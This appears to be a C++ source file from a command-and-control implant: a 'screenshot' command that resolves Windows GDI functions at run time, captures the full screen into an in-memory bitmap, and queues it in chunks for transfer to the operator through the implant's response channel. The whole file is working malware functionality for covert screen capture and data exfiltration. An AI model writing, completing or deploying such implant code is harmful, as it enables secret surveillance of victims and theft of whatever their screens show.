#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_SCREENSHOT

using namespace stardust;
using namespace starburst;

// GDI types and constants
typedef int ( WINAPI *fn_GetSystemMetrics )( int );
typedef HDC ( WINAPI *fn_GetDC )( HWND );
typedef int ( WINAPI *fn_ReleaseDC )( HWND, HDC );
typedef HDC ( WINAPI *fn_CreateCompatibleDC )( HDC );
typedef HBITMAP ( WINAPI *fn_CreateCompatibleBitmap )( HDC, int, int );
typedef HGDIOBJ ( WINAPI *fn_SelectObject )( HDC, HGDIOBJ );
typedef BOOL ( WINAPI *fn_BitBlt )( HDC, int, int, int, int, HDC, int, int, DWORD );
typedef int ( WINAPI *fn_GetDIBits )( HDC, HBITMAP, UINT, UINT, LPVOID, LPBITMAPINFO, UINT );
typedef BOOL ( WINAPI *fn_DeleteObject )( HGDIOBJ );
typedef BOOL ( WINAPI *fn_DeleteDC )( HDC );

#define SM_CXSCREEN 0
#define SM_CYSCREEN 1
#define SRCCOPY     0x00CC0020

auto declfn starburst::cmd_screenshot(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    (void)params;

    auto h_user32 = inst.kernel32.LoadLibraryA( symbol<const char*>( "user32.dll" ) );
    auto h_gdi32  = inst.kernel32.LoadLibraryA( symbol<const char*>( "gdi32.dll" ) );

    if ( !h_user32 || !h_gdi32 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "failed to load user32/gdi32" ) ) );
        return;
    }

    auto pGetSystemMetrics = reinterpret_cast<fn_GetSystemMetrics>(
        inst.kernel32.GetProcAddress( h_user32, symbol<LPCSTR>( "GetSystemMetrics" ) ) );
    auto pGetDC = reinterpret_cast<fn_GetDC>(
        inst.kernel32.GetProcAddress( h_user32, symbol<LPCSTR>( "GetDC" ) ) );
    auto pReleaseDC = reinterpret_cast<fn_ReleaseDC>(
        inst.kernel32.GetProcAddress( h_user32, symbol<LPCSTR>( "ReleaseDC" ) ) );
    auto pCreateCompatibleDC = reinterpret_cast<fn_CreateCompatibleDC>(
        inst.kernel32.GetProcAddress( h_gdi32, symbol<LPCSTR>( "CreateCompatibleDC" ) ) );
    auto pCreateCompatibleBitmap = reinterpret_cast<fn_CreateCompatibleBitmap>(
        inst.kernel32.GetProcAddress( h_gdi32, symbol<LPCSTR>( "CreateCompatibleBitmap" ) ) );
    auto pSelectObject = reinterpret_cast<fn_SelectObject>(
        inst.kernel32.GetProcAddress( h_gdi32, symbol<LPCSTR>( "SelectObject" ) ) );
    auto pBitBlt = reinterpret_cast<fn_BitBlt>(
        inst.kernel32.GetProcAddress( h_gdi32, symbol<LPCSTR>( "BitBlt" ) ) );
    auto pGetDIBits = reinterpret_cast<fn_GetDIBits>(
        inst.kernel32.GetProcAddress( h_gdi32, symbol<LPCSTR>( "GetDIBits" ) ) );
    auto pDeleteObject = reinterpret_cast<fn_DeleteObject>(
        inst.kernel32.GetProcAddress( h_gdi32, symbol<LPCSTR>( "DeleteObject" ) ) );
    auto pDeleteDC = reinterpret_cast<fn_DeleteDC>(
        inst.kernel32.GetProcAddress( h_gdi32, symbol<LPCSTR>( "DeleteDC" ) ) );

    if ( !pGetSystemMetrics || !pGetDC || !pReleaseDC || !pCreateCompatibleDC ||
         !pCreateCompatibleBitmap || !pSelectObject || !pBitBlt || !pGetDIBits ||
         !pDeleteObject || !pDeleteDC ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "API resolve failed" ) ) );
        return;
    }

    int width  = pGetSystemMetrics( SM_CXSCREEN );
    int height = pGetSystemMetrics( SM_CYSCREEN );

    HDC h_screen = pGetDC( nullptr );
    HDC h_mem    = pCreateCompatibleDC( h_screen );
    HBITMAP h_bmp = pCreateCompatibleBitmap( h_screen, width, height );

    pSelectObject( h_mem, h_bmp );
    pBitBlt( h_mem, 0, 0, width, height, h_screen, 0, 0, SRCCOPY );

    uint32_t row_stride = ((width * 3 + 3) & ~3);
    uint32_t pixel_size = row_stride * height;
    uint32_t bmp_size = 54 + pixel_size;

    auto bmp_buf = static_cast<uint8_t*>( inst.heap_alloc( bmp_size ) );
    if ( !bmp_buf ) {
        pDeleteObject( h_bmp );
        pDeleteDC( h_mem );
        pReleaseDC( nullptr, h_screen );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
        return;
    }

    BITMAPINFOHEADER bi = {};
    bi.biSize        = sizeof( BITMAPINFOHEADER );
    bi.biWidth       = width;
    bi.biHeight      = height;
    bi.biPlanes      = 1;
    bi.biBitCount    = 24;
    bi.biCompression = BI_RGB;
    bi.biSizeImage   = pixel_size;

    pGetDIBits( h_mem, h_bmp, 0, height, bmp_buf + 54,
        reinterpret_cast<BITMAPINFO*>( &bi ), DIB_RGB_COLORS );

    bmp_buf[0] = 'B'; bmp_buf[1] = 'M';
    *reinterpret_cast<uint32_t*>( bmp_buf + 2 )  = bmp_size;
    *reinterpret_cast<uint32_t*>( bmp_buf + 10 ) = 54;
    memory::copy( bmp_buf + 14, &bi, sizeof( bi ) );

    pDeleteObject( h_bmp );
    pDeleteDC( h_mem );
    pReleaseDC( nullptr, h_screen );

    uint32_t total_chunks = ( bmp_size + CHUNK_SIZE - 1 ) / CHUNK_SIZE;
    if ( total_chunks == 0 ) total_chunks = 1;

    // find free pending download slot
    int slot = -1;
    for ( uint32_t s = 0; s < inst.MAX_PENDING_DOWNLOADS; s++ ) {
        if ( !inst.downloads.entries[s].active ) {
            slot = static_cast<int>( s );
            break;
        }
    }

    if ( slot < 0 ) {
        inst.heap_free( bmp_buf );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "too many pending downloads" ) ) );
        return;
    }

    // store pending download state (in-memory buffer)
    auto& dl = inst.downloads.entries[slot];
    memory::copy( dl.task_uuid, task_uuid, 36 );
    dl.task_uuid[36] = '\0';
    dl.h_file       = INVALID_HANDLE_VALUE;
    dl.mem_buf      = bmp_buf;
    dl.total_size   = bmp_size;
    dl.total_chunks = total_chunks;
    dl.is_mem       = true;
    dl.active       = true;

    // queue DOWNLOAD_INIT only
    {
        auto pkg = package_create( inst );
        package_add_byte( inst, pkg, ACTION_POST_RESPONSE );
        package_add_string( inst, pkg, task_uuid );
        package_add_byte( inst, pkg, RESPONSE_PROCESSING );
        package_add_byte( inst, pkg, DOWNLOAD_INIT );
        package_add_int32( inst, pkg, total_chunks );
        package_add_int32( inst, pkg, bmp_size );
        package_add_string( inst, pkg, symbol<char*>( const_cast<char*>( "screenshot.bmp" ) ) );

        uint32_t data_len = 0;
        auto data = package_build( pkg, &data_len );

        uint32_t needed = inst.response_queue.length + 4 + data_len;
        if ( needed > inst.response_queue.capacity ) {
            uint32_t new_cap = inst.response_queue.capacity == 0 ? 1024 : inst.response_queue.capacity;
            while ( new_cap < needed ) new_cap *= 2;
            inst.response_queue.buffer = static_cast<uint8_t*>(
                inst.heap_realloc( inst.response_queue.buffer, new_cap ) );
            inst.response_queue.capacity = new_cap;
        }

        auto qbuf = inst.response_queue.buffer + inst.response_queue.length;
        qbuf[0] = (data_len >> 24) & 0xFF;
        qbuf[1] = (data_len >> 16) & 0xFF;
        qbuf[2] = (data_len >> 8)  & 0xFF;
        qbuf[3] = data_len & 0xFF;
        memory::copy( qbuf + 4, data, data_len );
        inst.response_queue.length += 4 + data_len;
        package_destroy( inst, pkg );
    }

    DBG_PRINT( inst, "screenshot init queued: %u bytes, %u chunks, slot %d\n",
        bmp_size, total_chunks, slot );
}

#endif
